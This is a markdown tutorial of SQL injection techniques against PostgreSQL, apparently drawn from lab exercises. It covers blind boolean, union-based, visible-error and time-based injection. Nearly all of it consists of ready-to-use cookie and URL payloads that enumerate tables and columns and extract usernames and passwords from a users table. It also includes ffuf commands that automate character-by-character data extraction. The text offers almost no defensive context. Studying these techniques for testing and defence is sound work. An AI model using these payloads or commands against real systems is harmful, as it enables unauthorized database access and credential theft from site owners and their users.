<h1>SQL Injection Exploitation Techniques - FOR EDUCATIONAL PURPOSES ONLY</h1>


<h1>Blind SQL injection with conditional responses</h1>

<mark>Scenario</mark>: The Server uses a tracking cookie to determine if it should display "Welcome back!" to the user. The server uses the user's tracking cookie in a SQL Query, and if any rows are returned
then the server displays a "Welcome back!" message on the page. The tracking cookie "TrackingId=" is vulnerable to Blind, Boolean-Based SQL Injection. Database = Postgresql

<h2>Finding A table_name</h2>

<h3>Payload</h3>

Cookie: tXX2fVoTYZwsDnHO'+and+(select+substring(table_name,1,1)+from+information_schema.tables+limit+1)='FUZZ'--

<mark>False Condition</mark>

<img width="1907" height="701" alt="blind-boolean-find-tableName-falseCondition" src="https://github.com/user-attachments/assets/79bc8a28-0050-4eb9-b379-96c3d623b4ca" />

<mark>True Condition

<img width="1914" height="699" alt="blind-boolean-find-tableName-trueCondition" src="https://github.com/user-attachments/assets/f42ed835-3233-457d-810c-0bd44c370b8e" />

<h2>Finding Length Of table_name</h2>

<h3>Payload</h3>

Cookie: TrackingId=A6Of9fkbCW83W07V'+and+(select+length(table_name)+from+information_schema.tables+limit+1)=5--

<mark>False Condition</mark>

<img width="1911" height="700" alt="blind-boolean-find-length-of-tableName-falseCondition" src="https://github.com/user-attachments/assets/1144f284-8bb2-4432-9aa6-12ca36517912" />

<mark>True Condition</mark>

<img width="1910" height="696" alt="blind-boolean-find-length-of-tableName-trueCondition" src="https://github.com/user-attachments/assets/fb500407-a40f-474d-8a5e-1e53d6b059f1" />


<h3>FFUF Payload To Find table_name</h3>

Now that we have the length of the table_name, we can use FFUF with Multiple Variables to find the table_name.

Cookie: TrackingId=tXX2fVoTYZwsDnHO'+and+(select+substring(table_name,NUMBERZ,1)+from+information_schema.tables+limit+1)='CHARACTERZ'--

ffuf -u 'https://example.com' -H "Cookie: tXX2fVoTYZwsDnHO'+and+(select+substring(table_name,NUMBERZ,1)+from+information_schema.tables+limit+1)='CHARACTERZ'--" -w numbers.txt:NUMBERZ -w characters.txt:CHARACTERZ -mr "Welcome back!"


<h1>Union-Based SQL Injection</h1>

<mark>Scenario</mark>: The server displays articles for users to read. The Server uses a category parameter as a filter to only display articles about specific topics. The category parameter is vulnerable to Union-Based SQL Injection. Database = Postgresql

<h2>Finding Number Of Rows Returned With ORDER BY</h2>

Payload: /filter?category=Gifts'+order+by+2--

<mark>False Number Of Rows</mark>

<img width="1911" height="700" alt="find-number-of-rows-returned-false" src="https://github.com/user-attachments/assets/56ecba62-9236-4d4a-8b4b-72785f8bb6d8" />


<mark>True Number Of Rows</mark>

<img width="1912" height="702" alt="find-number-of-rows-returned-true" src="https://github.com/user-attachments/assets/ceaea75e-ca6a-4317-bc61-8bfc4ad9c9d5" />



<h2>Finding Number Of Rows Returned With SELECT NULL</h2>

Payload: /filter?category=Gifts'union+select+null,null--

<mark>False Number Of Rows</mark>

<img width="1910" height="695" alt="find-number-of-rows-returned-order-by-false" src="https://github.com/user-attachments/assets/fbcb2717-9cbb-428f-b932-0a0f4939bdb3" />



<mark>True Number Of Rows</mark>

<img width="1909" height="697" alt="find-number-of-rows-returned-null-true" src="https://github.com/user-attachments/assets/c00d3801-edf5-4d8c-9d2f-2629ac5039b4" />


<h2>Finding The SQL DBMS Version</h2>

Payload: /filter?category=x'union+select+null,version()--

<img width="1908" height="701" alt="find-dbms-version" src="https://github.com/user-attachments/assets/46a66cbb-97b7-4920-8fcc-d220441d48f4" />


<h2>Finding Table_Names</h2>

Payload: /filter?category=x'union+select+null,table_name+from+information_schema.tables--

<img width="1904" height="701" alt="find-table_names" src="https://github.com/user-attachments/assets/a5bce471-602f-4794-b28b-98c8c8d49044" />

<h2>Finding Column_Names</h2>

Payload: /filter?category=x'union+select+null,column_name+from+information_schema.columns+where+table_name='users'--

<img width="1905" height="695" alt="find-column_names" src="https://github.com/user-attachments/assets/f274468e-e89c-4347-8c1d-36e87c2646f6" />


<h2>View Mulitple Columns With String Concatenation</h2>

Payload: /filter?category=x'union+select+null,username||':'||password+from+users--

<img width="1898" height="696" alt="view-authentication-data-union-based" src="https://github.com/user-attachments/assets/5de306ef-3c64-41f1-9988-a30dc05b98d2" />


<h1>Visible-Error Based SQL Injection To Leak Unauthorized Data</h1>

<mark>Scenario</mark>: The Server uses one of the client's cookies as a tracking cookie and makes a backend SQL Query with the tracking cookie. Users can break the syntax of the backend query by injecting into the "TrackingId=" cookie, which causes the server to display an informational error message to the user. The tracking cookie "TrackingId=" is therefore vulnerable to Visible-Error Based SQL Injection. Database = Postgresql

<h1>Visible-Error Based SQL Injection - AND Boolean</h1>

<h2>Identifying The Visible SQL Error</h2>

Payload - Cookie: TrackingId=wT5EzibWN23Zg95W'

<img width="1911" height="698" alt="identify-visible-error" src="https://github.com/user-attachments/assets/2d950f69-ca31-4615-8ccb-9ebe875d43b3" />

<h2>Identifying The DBMS Version</h2>

Payload - Cookie: TrackingId=x'+and+1=cast((select+version())as+int)--

<img width="1910" height="699" alt="identify-version-and-boolean" src="https://github.com/user-attachments/assets/5e22cf41-82a9-436f-a7d2-b5ffe633062c" />


<h2>Identifying A Username</h2>

Payload - Cookie: TrackingId=x'+and+1=cast((select+username+from+users+limit+1)as+int)--

<img width="1910" height="699" alt="identify-username-and-boolean" src="https://github.com/user-attachments/assets/2e452d1f-ab21-4ec6-95a7-d4faefe3d085" />


<h2>Identifying A Password</h2>

Payload - Cookie: TrackingId=x'+and+1=cast((select+password+from+users+limit+1)as+int)--

<img width="1906" height="696" alt="identify-password-and-boolean" src="https://github.com/user-attachments/assets/229e69a8-5705-46ce-888b-bd5702433041" />


<h1>Visible-Error Based SQL Injection - Stacked Queries</h1>

<h2>Identifying The Visible SQL Error</h2>

Payload -  Cookie: TrackingId=wT5EzibWN23Zg95W'

<img width="1911" height="698" alt="identify-visible-error" src="https://github.com/user-attachments/assets/2d950f69-ca31-4615-8ccb-9ebe875d43b3" />

<h2>Identifying The DBMS Version</h2>

Payload - Cookie: TrackingId='%3bselect+cast((select+version())as+int)%3b--

<img width="1904" height="699" alt="identify-version" src="https://github.com/user-attachments/assets/8e726d33-7f82-46d9-afe1-0033c5d908c3" />

<h2>Identifying A Username</h2>

Payload - Cookie: TrackingId='%3bselect+cast((select+username+from+users+limit+1)as+int)%3b--

<img width="1908" height="700" alt="identify-username" src="https://github.com/user-attachments/assets/c4177917-d48f-46d7-8ebe-96400145e83b" />


<h2>Identifying A Password</h2>

Payload - Cookie: TrackingId='%3bselect+cast((select+password+from+users+limit+1)as+int)%3b--

<img width="1909" height="696" alt="identify-password" src="https://github.com/user-attachments/assets/63296533-958b-4b83-88e1-b9e2fb40b26c" />


<h1>Time-Based SQL Injection</h1>


<mark>Scenario</mark>: The Server uses one of the client's cookies as a tracking cookie and makes a backend, asyncronous SQL Query with the unsanitized tracking cookie. Users can therefor cause a time-based conditional delay in the SQL server's response. Database = Postgresql

<h1>Time-Based SQL Injection - Concatenated Conditional Time Delay</h1>


<h2>Causing A Time Delay</h2>

Payload - Cookie: TrackingId='||pg_sleep(10)--

<img width="1914" height="696" alt="causing-a-time-delay-concatentation" src="https://github.com/user-attachments/assets/921d55bf-f097-40a8-b91f-3d669411d86c" />


<h2>Finding A Table_Name</h2>

To infer a table_name from the database, we can use conditional time delays and the substring() method to infer each letter of a table_name. If the condition is true, the server will delay 5 seconds. If the condition is false, the server will not delay. Examine the payload and images, below.

Payload - Cookie: TrackingId='||(select+case+when+(select+substring(table_name,1,1)+from+information_schema.tables+limit+1)='u'+then+pg_sleep(5)+else+pg_sleep(0)+end)||'

<mark>False Condition</mark>

<img width="1907" height="694" alt="false-condition-find-substring-table_name" src="https://github.com/user-attachments/assets/a79e10dc-9580-42b2-8b1c-121d42418f22" />


<mark>True Condition</mark>

<img width="1910" height="693" alt="true-condition-find-substring-table_name" src="https://github.com/user-attachments/assets/868abbd3-1df0-42f8-aa03-7254ce5761a7" />

<h2>Finding Length() Of Table_Name</h2>

To infer the length of a table_name, we can use conditional time delays and the length() method to infer the table_name length. If the condition is true, the server will delay 5 seconds. If the condition is false, the server will not delay. Examine the payload and images, below.

Payload - Cookie: TrackingId='||(select+case+when+length((select+table_name+from+information_schema.tables+limit+1))=5+then+pg_sleep(5)+else+pg_sleep(0)+end)||'

<mark>False Condition</mark>

<img width="1907" height="698" alt="false-condition-find-length-of-table_name" src="https://github.com/user-attachments/assets/79d38683-4227-4fd0-88f2-4675180f6001" />


<mark>True Condition</mark>

<img width="1910" height="690" alt="true-condition-find-length-of-table_name" src="https://github.com/user-attachments/assets/bacc23f8-c7c4-4374-b744-e0f02cbd7a38" />

<h2>FFUF To Find Table_Name</h2>

Now that we know the length of the table_name, we can use FFUF with Multiple Variables to infer the exact table_name

Payload - Cookie: TrackingId='||(select+case+when+(select+substring(table_name,NUMBERZ,1)+from+information_schema.tables+limit+1)='CHARACTERZ'+then+pg_sleep(5)+else+pg_sleep(0)+end)||'

ffuf -u 'https://example.com' -H "Cookie: TrackingId='||(select+case+when+(select+substring(table_name,NUMBERZ,1)+from+information_schema.tables+limit+1)='CHARACTERZ'+then+pg_sleep(5)+else+pg_sleep(0)+end)||'" -w numbers.txt:NUMBERZ -w characters.txt:CHARACTERZ -mt '>2000'

<mark>The above FFUF command will filter for requests that are delayed for more than 2000 milliseconds (2 seconds)</mark>

<h2>Find A Column_Name</h2>

We can infer a column_name with the same conditional time-delays that we used above. With conditional-time delays, we can either infer the entire column_name all at one, or one character at a time. See payload and image below.

Payload - Cookie: TrackingId='||(select+case+when+(select+column_name+from+information_schema.columns+where+table_name='users'+limit+1)='username'+then+pg_sleep(5)+else+pg_sleep(0)+end)||'

<mark>True Condition</mark>

<img width="1912" height="696" alt="find-column_name-all-at-once" src="https://github.com/user-attachments/assets/1b4759fb-ef54-4456-b3a6-f2fe579d4d68" />


<h2>Find A Column_Name One Character At A Time</h2>

Here we are infering the column_name one character at a time. See payload and image below.

Payload - Cookie: TrackingId='||(select+case+when+(select+substring(column_name,1,1)+from+information_schema.columns+where+table_name='users'+limit+1)='u'+then+pg_sleep(5)+else+pg_sleep(0)+end)||'

<mark>True Condition</mark>

<img width="1908" height="696" alt="find-column_name-one-char-at-a-time" src="https://github.com/user-attachments/assets/c5bddbd5-4f51-4de6-b780-1772e5a18ba7" />


<h1>Time-Based SQL Injection - Stacked Query - Conditional Time Delay</h1>

<h2>Causing A Time Delay</h2>

Payload - Cookie: TrackingId='%3bselect+pg_sleep(3)--

<img width="1906" height="696" alt="causing-a-time-delay-stacked-query" src="https://github.com/user-attachments/assets/cfd9aded-db39-4507-8611-aa9e7000f491" />

<h1><mark>TO BE CONTINUED</mark></h1>
